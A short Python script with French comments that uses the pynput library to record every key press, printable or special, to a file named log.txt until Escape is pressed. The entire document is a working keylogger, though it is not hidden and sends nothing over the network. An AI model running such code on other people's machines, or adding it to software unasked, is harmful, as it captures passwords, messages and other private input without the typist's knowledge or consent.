from pynput import keyboard

# Fonction appelée chaque fois qu'une touche est pressée
def on_press(key):
    try:
        # Écriture de la touche pressée dans le fichier
        with open("log.txt", "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Si la touche n'est pas imprimable, l'écrire sous forme de chaîne
        with open("log.txt", "a") as f:
            f.write(f"{key} (special)\n")

# Fonction appelée lorsque la touche est relâchée
def on_release(key):
    if key == keyboard.Key.esc:  # Si la touche Échap est pressée, arrêter l'écoute
        return False

# Début de l'écoute des touches
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
